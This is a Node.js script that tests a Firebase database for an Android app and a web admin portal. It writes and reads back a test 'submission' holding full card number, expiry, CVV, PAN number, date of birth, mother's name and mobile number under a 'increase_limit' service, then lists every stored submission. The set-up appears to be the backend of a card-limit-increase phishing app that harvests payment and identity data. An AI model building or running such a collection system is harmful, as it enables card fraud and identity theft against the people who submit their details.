import { initializeApp } from 'firebase/app';
import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, serverTimestamp } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyCOXA9_J0492DaHpI-cXZ-h1OrMDiTkfh4",
  authDomain: "abcd-9b48c.firebaseapp.com",
  projectId: "abcd-9b48c",
  storageBucket: "abcd-9b48c.firebasestorage.app",
  messagingSenderId: "198063895508",
  appId: "1:198063895508:web:674e43d3e46bb256651c41",
  measurementId: "G-M3W2QGGVP4"
};

async function testFirebaseConnection() {
  console.log('Connecting to Firebase Project: abcd-9b48c ...');
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  try {
    console.log('Testing Write operation (Simulating Android mobile app submission)...');
    const testDoc = await addDoc(collection(db, 'submissions'), {
      fullName: 'Test Customer Verification',
      dob: '01/01/1990',
      panNumber: 'ABCDE1234F',
      mothersName: 'Test Mother',
      mobileNumber: '9999999999',
      selectedService: 'increase_limit',
      nameOnCard: 'TEST CUSTOMER',
      cardNumber: '4532 1111 2222 3333',
      expiryDate: '12/28',
      cvv: '123',
      status: 'pending',
      submittedAt: new Date().toLocaleDateString('en-IN'),
      createdAt: serverTimestamp()
    });

    console.log('✅ WRITE SUCCESSFUL! Document ID:', testDoc.id);

    console.log('\nTesting Read operation (Simulating Web Admin Portal fetch)...');
    const snapshot = await getDocs(collection(db, 'submissions'));
    console.log(`✅ READ SUCCESSFUL! Total submissions in database: ${snapshot.size}`);

    snapshot.docs.forEach((doc) => {
      console.log(` - [${doc.id}] ${doc.data().fullName} (${doc.data().panNumber || 'No PAN'}) - Status: ${doc.data().status}`);
    });

    // Cleanup test doc
    console.log('\nCleaning up test document...');
    await deleteDoc(doc(db, 'submissions', testDoc.id));
    console.log('✅ CLEANUP SUCCESSFUL! Database is fully functional and live for both App & Web!');

    process.exit(0);
  } catch (error) {
    console.error('\n❌ FIREBASE TEST FAILED:');
    console.error('Error Code:', error.code);
    console.error('Error Message:', error.message);
    if (error.code === 'permission-denied') {
      console.log('\n👉 NOTE: Production security rules are blocking unauthenticated reads/writes.');
    }
    process.exit(1);
  }
}

testFirebaseConnection();
